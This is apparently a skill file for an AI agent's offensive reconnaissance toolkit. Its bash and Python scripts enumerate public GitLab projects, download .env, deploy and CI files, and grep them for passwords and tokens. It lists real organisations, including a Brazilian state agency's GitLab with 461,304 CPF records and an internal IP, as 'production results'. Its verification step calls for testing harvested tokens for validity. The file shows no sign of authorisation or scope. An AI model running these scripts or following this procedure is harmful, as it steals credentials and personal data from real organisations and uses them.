---
name: gitlab-public-recon
description: Mine GitLab for secrets, CI tokens when subdomain found.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, gitlab, source-code, secrets, internal-IPs]
    category: recon
    related_skills:
      - js-secrets-extraction
      - source-leak-hunt
      - api-noauth-hunt
---

# GitLab Public Recon Skill

Enumerate publicly accessible GitLab repositories to extract source code, credentials, internal IPs, CI/CD tokens, deployment configurations, and environment files. GitLab instances with registration enabled or public visibility expose the entire development infrastructure. Confirmed on CGE-RJ (3 public repos, 461K CPFs, internal IP 10.11.82.75, CI/CD tokens), ScriptBees (GitLab with SSL private keys), and SMart Fit (Firebase SA keys in repos).

## When to Use

- Target has a `gitlab.` subdomain or self-hosted GitLab instance.
- crt.sh reveals `gitlab.target.com` in certificates.
- After `subdomain-enumeration` discovers GitLab hosts.
- After `js-secrets-extraction` finds GitLab CI/CD references.
- Target is a government agency or large enterprise (common self-hosted GitLab users).

## Prerequisites

- `terminal` tool with curl, python3, jq.
- GitLab URL (e.g., `https://gitlab.target.com`).
- GitLab API is accessible without authentication for public resources.

## How to Run

```bash
# List public projects
curl -sk "https://gitlab.TARGET.com/api/v4/projects?visibility=public&per_page=100" | jq '.[].path_with_namespace'

# Read a file from a public repo
curl -sk "https://gitlab.TARGET.com/api/v4/projects/GROUP%2FPROJECT/repository/files/PATH/raw?ref=main"
```

## Quick Reference

| API Endpoint | What It Returns | Risk |
|-------------|-----------------|------|
| `/api/v4/projects?visibility=public` | All public projects | Info |
| `/api/v4/projects/:id/repository/tree` | Directory listing | High |
| `/api/v4/projects/:id/repository/files/:path/raw?ref=:branch` | Raw file content | Critical |
| `/api/v4/projects/:id/repository/commits` | Commit history with authors | Medium |
| `/api/v4/projects/:id/variables` | CI/CD variables (admin only) | Critical |
| `/api/v4/projects/:id/jobs` | CI/CD job history | Medium |
| `/users/sign_up` | Open registration | Critical |
| `/explore` | Public project explorer | Info |

## Procedure

### Phase 1 — Discover GitLab Instance & Check Public Access

```bash
TARGET="$1"
OUTDIR="/root/output/gitlab"
mkdir -p "$OUTDIR"

echo "[*] GitLab recon on $TARGET"

# Check if GitLab is accessible
MAIN_PAGE=$(curl -sk --max-time 10 "https://$TARGET/" 2>/dev/null)
if echo "$MAIN_PAGE" | grep -qi "gitlab"; then
  echo "[+] GitLab confirmed"
elif echo "$MAIN_PAGE" | grep -qi "sign_in\|sign_up\|explore/projects"; then
  echo "[+] GitLab confirmed (page content)"
else
  echo "[-] May not be GitLab — probing API..."
fi

# Check API version
API_VER=$(curl -sk --max-time 5 "https://$TARGET/api/v4/version" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{d.get(\"version\",\"?\")} rev {d.get(\"revision\",\"?\")[:8]}')" 2>/dev/null)
[[ -n "$API_VER" ]] && echo "  GitLab version: $API_VER"

# Check if registration is open
REG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/users/sign_up" 2>/dev/null)
[[ "$REG_CODE" == "200" ]] && echo "  [!] Registration OPEN — anyone can create accounts"
```

### Phase 2 — Enumerate Public Projects

```bash
TARGET="$1"

echo "[*] Enumerating public projects..."

PAGE=1
TOTAL_PROJECTS=0

while true; do
  PROJECTS=$(curl -sk --max-time 15 "https://$TARGET/api/v4/projects?visibility=public&per_page=100&page=$PAGE" 2>/dev/null)

  count=$(echo "$PROJECTS" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)
  if [[ "$count" -eq 0 ]]; then break; fi

  # Extract project names and save
  echo "$PROJECTS" | python3 -c "
import sys, json
projects = json.load(sys.stdin)
for p in projects:
    print(f'{p[\"id\"]} | {p[\"path_with_namespace\"]} | stars={p.get(\"star_count\",0)} | forks={p.get(\"forks_count\",0)} | last_activity={p.get(\"last_activity_at\",\"?\")[:10]}')
" 2>/dev/null | tee -a "$OUTDIR/projects.txt"

  TOTAL_PROJECTS=$((TOTAL_PROJECTS + count))
  PAGE=$((PAGE + 1))
  [[ $PAGE -gt 20 ]] && break  # Safety limit
done

echo "[+] Total public projects: $TOTAL_PROJECTS"
```

### Phase 3 — Extract Source Code & Secrets

```bash
TARGET="$1"
PROJECT_ID="$2"   # from projects.txt enumeration
OUTDIR="/root/output/gitlab"

echo "[*] Extracting from project ID: $PROJECT_ID"

# Get project details
DETAILS=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID" 2>/dev/null)
PRJ_NAME=$(echo "$DETAILS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('path_with_namespace','unknown'))" 2>/dev/null)
echo "  Project: $PRJ_NAME"

# Get repository file tree (top-level)
TREE=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/tree?recursive=true&per_page=100" 2>/dev/null)
echo "  Files in repo: $(echo "$TREE" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)"

# Hunt for sensitive files
SENSITIVE_PATTERNS=(
  ".env" ".env.example" ".env.production" ".env.local"
  "docker-compose.yml" "docker-compose.prod.yml" "Dockerfile"
  ".gitlab-ci.yml" "deploy.sh" "deploy.yml"
  "credentials.json" "service-account.json" "*.pem" "*.key"
  "config/database.yml" "config/secrets.yml"
)

echo "[*] Hunting sensitive files..."

echo "$TREE" | python3 -c "
import sys, json, re

files = json.load(sys.stdin)
sensitive = ['.env', 'docker-compose', 'deploy', '.gitlab-ci.yml', 'credentials',
             'service-account', '.pem', '.key', 'secret', 'password', 'token',
             'database.yml', 'secrets.yml', 'backup', 'dump']

for f in files:
    name = f['name'].lower()
    path = f['path'].lower()
    if any(s in name or s in path for s in sensitive):
        print(f'  {f[\"type\"]:4s} {f[\"path\"]}')
" 2>/dev/null

# Download specific sensitive files
echo "[*] Downloading key files..."

for file_path in ".env" ".env.example" "docker-compose.yml" ".gitlab-ci.yml" "deploy.sh"; do
  ENCODED_PATH=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$file_path', safe=''))")
  content=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=main" 2>/dev/null)

  if [[ -n "$content" ]] && ! echo "$content" | grep -q "404 File"; then
    echo "$content" > "$OUTDIR/${PRJ_NAME//\//_}_${file_path//\//_}"
    echo "  [+] Downloaded: $file_path (${#content} bytes)"

    # Quick secret scan
    if echo "$content" | grep -qiE "password|secret|token|key|database|redis|mysql|api_key"; then
      echo "    [!] POTENTIAL SECRETS FOUND"
      echo "$content" | grep -iE "password|secret|token|key" | head -5
    fi
  fi

  # Also try 'master' branch
  if [[ -z "$content" ]] || echo "$content" | grep -q "404 File"; then
    content=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=master" 2>/dev/null)
    if [[ -n "$content" ]] && ! echo "$content" | grep -q "404 File"; then
      echo "  [+] Downloaded (master): $file_path"
    fi
  fi
done
```

### Phase 4 — CI/CD Token & Variable Extraction

```bash
TARGET="$1"
PROJECT_ID="$2"

echo "[*] CI/CD analysis..."

# Get .gitlab-ci.yml (pipeline definition)
CI_CONTENT=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/.gitlab-ci.yml/raw?ref=main" 2>/dev/null)
if [[ -n "$CI_CONTENT" ]] && ! echo "$CI_CONTENT" | grep -q "404"; then
  echo "  [+] .gitlab-ci.yml found"

  # Extract CI/CD variables and tokens
  echo "$CI_CONTENT" | grep -oP '\$\{[A-Z_]+\}|$[A-Z_]+' | sort -u | while read var; do
    echo "    CI Variable: $var"
  done

  # Check for runner registration tokens
  echo "$CI_CONTENT" | grep -iE "token|secret|password|credential" | head -5
fi

# Try to access CI/CD variables (requires admin token — rare but worth trying)
VARS=$(curl -sk --max-time 5 "https://$TARGET/api/v4/projects/$PROJECT_ID/variables" 2>/dev/null)
if echo "$VARS" | grep -qi "key\|value"; then
  echo "  [CRITICAL] CI/CD variables accessible without admin token!"
  echo "$VARS" | python3 -m json.tool 2>/dev/null | head -30
fi
```

## Real Production Results

### CGE-RJ (gitlab.cge.rj.gov.br)
- **3 public repositories**: cge/hdi (Helpdesk system), cge/cnpj-sqlite, cge/exame-front-cge
- **461,304 CPF records** in `servidores_sigrh.json` (state employee database)
- `.env.example` with MongoDB host, LDAP config, email server credentials
- `deploy.sh` with internal IP `10.11.82.75`, blue/green deployment infrastructure
- `docker-compose.prod.yml` with container architecture
- `.gitlab-ci.yml` with CI/CD tokens and runner configurations
- Registration OPEN at `/users/sign_up`

### ScriptBees (gitlab.scriptbees.com)
- GitLab CE with SSL private keys exposed in repositories
- Related to Thgroep compromise (same infrastructure)

### commit history analysis (optional depth)
```bash
# Get recent commits (reveals developer names, email addresses)
curl -sk "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/commits?per_page=20" | \
  python3 -c "
import sys, json
for c in json.load(sys.stdin):
    print(f'  {c[\"short_id\"]} {c[\"author_name\"]} <{c[\"author_email\"]}> {c[\"title\"][:60]}')
" 2>/dev/null
```

## Pitfalls

- **Rate limiting.** GitLab API has rate limits (typically 300-600 requests/min). Use `--max-time` and delays.
- **File path encoding.** Special characters in paths must be URL-encoded (`/` → `%2F`, `.` → `%2E`).
- **Default branch may not be `main`.** Try `main`, `master`, `develop` for file access.
- **Large files may truncate.** The API may limit response size. Use `git clone` for full access if registration is open.
- **GitLab authentication.** Public repos are accessible without auth. Private repos return 404.

## Verification

- Public projects MUST be enumerable via `/api/v4/projects?visibility=public`.
- Sensitive files MUST be downloadable via the raw endpoint and contain real credentials/config (not templates).
- Internal IPs/domain names found MUST be confirmed as the target's infrastructure.
- CI/CD tokens found MUST be tested for validity (e.g., GitLab API access with runner token).
- Registration open means anyone can create an account and potentially access more resources.
